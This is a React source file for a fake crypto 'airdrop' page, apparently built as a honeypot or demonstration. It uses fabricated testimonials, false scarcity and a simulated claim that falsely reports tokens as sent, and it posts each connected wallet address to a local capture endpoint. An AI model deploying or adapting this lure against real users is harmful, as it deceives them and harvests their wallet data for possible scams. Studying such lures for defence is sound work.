import { useState, useEffect } from 'react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount } from 'wagmi';

export default function AirdropPage() {
  const { open } = useAppKit();
  const { address, isConnected } = useAccount();
  const [claimed, setClaimed] = useState(false);
  const [claiming, setClaiming] = useState(false);
  const [walletCaptured, setWalletCaptured] = useState(false);

  // Capture wallet address when connected
  useEffect(() => {
    if (isConnected && address && !walletCaptured) {
      console.log('🎣 Wallet captured:', address);
      // Use timeout to avoid synchronous setState in effect
      setTimeout(() => setWalletCaptured(true), 0);

      // Optional: Send to backend for monitoring
      fetch('http://localhost:3001/api/honeypot/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, timestamp: new Date().toISOString() }),
      }).catch((err) => console.error('Failed to log wallet:', err));
    }
  }, [isConnected, address, walletCaptured]);

  const handleClaim = async () => {
    if (!isConnected) {
      alert('Please connect your wallet first!');
      return;
    }

    setClaiming(true);

    // Simulate claim processing
    setTimeout(() => {
      setClaimed(true);
      setClaiming(false);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-black text-white">
      <div className="container mx-auto px-4 py-16">
        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-6xl font-bold mb-4 bg-gradient-to-r from-yellow-400 to-pink-500 text-transparent bg-clip-text">
            🎁 EXCLUSIVE AIRDROP 🎁
          </h1>
          <p className="text-2xl text-gray-300">
            Claim your{' '}
            <span className="text-yellow-400 font-bold">10,000 DRAIN</span>{' '}
            tokens now!
          </p>
        </div>

        {/* Fake token info */}
        <div className="max-w-2xl mx-auto bg-gray-800/50 backdrop-blur-lg rounded-2xl p-8 shadow-2xl mb-8">
          <div className="grid grid-cols-2 gap-6 mb-8">
            <div className="text-center">
              <p className="text-gray-400 text-sm">Total Airdrop</p>
              <p className="text-3xl font-bold text-yellow-400">
                1,000,000 DRAIN
              </p>
            </div>
            <div className="text-center">
              <p className="text-gray-400 text-sm">Per Wallet</p>
              <p className="text-3xl font-bold text-green-400">10,000 DRAIN</p>
            </div>
          </div>

          <div className="bg-blue-500/10 border border-blue-500 rounded-lg p-4 mb-6">
            <p className="text-sm text-blue-300">
              ⚡ <span className="font-bold">Limited Time!</span> Only{' '}
              <span className="text-yellow-400">247</span> slots remaining
            </p>
          </div>

          {/* Connect wallet button */}
          <div className="flex justify-center mb-6">
            <button
              onClick={() => open()}
              className="px-8 py-3 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold rounded-lg transition transform hover:scale-105"
            >
              {isConnected
                ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
                : 'Connect Wallet'}
            </button>
          </div>

          {/* Claim button */}
          {isConnected && (
            <button
              onClick={handleClaim}
              disabled={claiming || claimed}
              className="w-full bg-gradient-to-r from-yellow-400 to-pink-500 hover:from-yellow-500 hover:to-pink-600 disabled:from-gray-600 disabled:to-gray-700 text-black disabled:text-gray-400 font-bold py-4 px-8 rounded-xl text-xl transition-all transform hover:scale-105 disabled:scale-100"
            >
              {claimed
                ? '✅ Claimed! Tokens in your wallet'
                : claiming
                  ? '⏳ Claiming...'
                  : '🚀 Claim 10,000 DRAIN'}
            </button>
          )}

          {claimed && (
            <div className="mt-6 bg-green-500/10 border border-green-500 rounded-lg p-4">
              <p className="text-center text-green-400">
                🎉 Congratulations! Your tokens have been sent to{' '}
                {address?.slice(0, 6)}...{address?.slice(-4)}
              </p>
            </div>
          )}
        </div>

        {/* Fake testimonials */}
        <div className="max-w-4xl mx-auto grid md:grid-cols-3 gap-4">
          <div className="bg-gray-800/30 rounded-lg p-4">
            <p className="text-sm text-gray-300 mb-2">
              &quot;Just claimed 10k DRAIN! Easy!&quot;
            </p>
            <p className="text-xs text-gray-500">- 0x742d...9f2a</p>
          </div>
          <div className="bg-gray-800/30 rounded-lg p-4">
            <p className="text-sm text-gray-300 mb-2">
              &quot;Legit airdrop, received instantly ⚡&quot;
            </p>
            <p className="text-xs text-gray-500">- 0x3e8a...4c1b</p>
          </div>
          <div className="bg-gray-800/30 rounded-lg p-4">
            <p className="text-sm text-gray-300 mb-2">
              &quot;Best airdrop of 2025! 🚀&quot;
            </p>
            <p className="text-xs text-gray-500">- 0x9d2f...7a3e</p>
          </div>
        </div>

        {/* Dev info (remove in production) */}
        {walletCaptured && (
          <div className="mt-8 max-w-2xl mx-auto bg-red-900/20 border border-red-500 rounded-lg p-4">
            <p className="text-red-400 text-sm">
              🎣 <span className="font-bold">DEV MODE:</span> Wallet {address}{' '}
              captured and logged
            </p>
          </div>
        )}
      </div>
    </div>
  );
}
